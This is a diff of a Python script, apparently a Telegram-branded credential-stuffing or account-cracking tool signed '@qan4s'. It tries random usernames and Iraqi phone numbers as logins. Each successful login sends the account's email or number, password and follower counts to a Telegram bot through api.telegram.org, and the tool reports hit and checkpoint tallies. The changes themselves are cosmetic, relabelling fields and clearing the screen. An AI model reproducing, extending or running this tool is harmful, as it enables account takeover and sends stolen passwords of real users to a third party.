@@ -86,7 +86,7 @@ def qanasm(username, pas):
     info_list = info_list.replace(following + "Following, ", "")
     posts = info_list[0:info_list.index("Posts")]
     sleep(1)
-    requests.post("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + ID + "&text=⁦⌯  Hi Qanas Coder 💯 ⌯\n — — — — —  — — — — — . \n.✥. E𝗆𝖺𝗂𝗅  :" + Email + "\n.✥. Pass  : " + pas + "\n.✥. User  : " + username + "\n.✥. Follwers : " + followers + "\n.✥. Foolowing : " + following + "\n.✥. Post : " + posts + "\n— — — — —  — — — — —\n• Tele : @qan4s .")
+    requests.post("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + ID + "&text=⁦⌯  Hi Qanas Coder 💯 ⌯\n — — — — —  — — — — — . \n.✥. NUMBER  :" + Email + "\n.✥. Pass  : " + pas + "\n.✥. User  : " + username + "\n.✥. Follwers : " + followers + "\n.✥. Foolowing : " + following + "\n.✥. Post : " + posts + "\n— — — — —  — — — — —\n• Tele : @qan4s .")
 
 
 def main():
@@ -147,7 +147,8 @@ def main():
             r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
         else:
             Sk += 1
-            r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. T E S T E D 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
+            r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
+            os.system("clear")
             
             print(logo2)
             user = str(''.join((random.choice(new) for i in range(7))))
@@ -187,7 +188,8 @@ def main():
                 r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
             else:
                 Sk += 1
-                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. T E S T E D 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
+                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
+                os.system("clear")
                 
                 print(logo2)
                 user = str(''.join((random.choice(new) for i in range(7))))
@@ -227,7 +229,8 @@ def main():
                 r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
             else:
                 Sk += 1
-                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. T E S T E D 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
+                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
+                os.system("clear")
                 
                 user = str(''.join((random.choice(new) for i in range(7))))
             q = '+964'
@@ -266,8 +269,8 @@ def main():
                 r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Qanas Coder 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @qan4s .")
             else:
                 Sk += 1
-                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. T E S T E D 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
-
+                r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome To Script Qanas   ⁦✰︎\n-----------------------------------------\n.✥. Successful  : {Ok}\n\n.✥. Checkpoint  : {Cp}\n-----------------------------------------\n.✥. T E S T E D : {Sk}\n-----------------------------------------\n.✥. NUMBER 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @qan4s")
+                os.system("clear")
 
 
 
